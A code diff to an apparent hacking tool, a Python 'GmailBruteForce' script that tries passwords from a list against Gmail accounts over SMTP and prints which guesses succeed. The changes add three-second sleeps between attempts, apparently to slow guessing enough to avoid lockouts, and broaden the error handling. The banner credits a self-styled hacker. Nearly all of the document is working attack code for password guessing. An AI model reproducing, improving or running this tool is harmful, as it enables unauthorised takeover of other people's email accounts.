@@ -3,6 +3,7 @@ from __future__ import absolute_import
 from __future__ import print_function
 from six.moves import input
 import smtplib
+from time import sleep
 
 class GmailBruteForce():
     def __init__(self):
@@ -31,17 +32,19 @@ class GmailBruteForce():
             for password in self.passwords:
                 try:
                     self.smtp.login(user,password)
+                    sleep(3)
                     print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
                     self.smtp.quit()
                     self.init_smtplib()
                     break;
-                except smtplib.SMTPAuthenticationError:
+                except:
+                    sleep(3)
                     # print("\033[1;31msorry \033[1;m")
-                    print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))
+                    print(("\033[1;31msorry %s <- " % user + " -> %s \033[1;m" % password ))
 
 print('''
 	==================================
-	|      [Gmail] ==> 3             |
+	|      [Gmail] ==> 4             |
 	|--------------------------------|
 	| snapchat: flaah999             |
 	| CoDeD By TA Hacker (@0xfff0800)|
@@ -66,6 +69,7 @@ if do == '1':
     headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
     instance.try_gmail()
+    sleep(3)
    
 ############
 if do == '2':
@@ -77,3 +81,4 @@ if do == '2':
     instance.get_pass_list(senha)
 
     instance.try_gmail()
+    sleep(3)
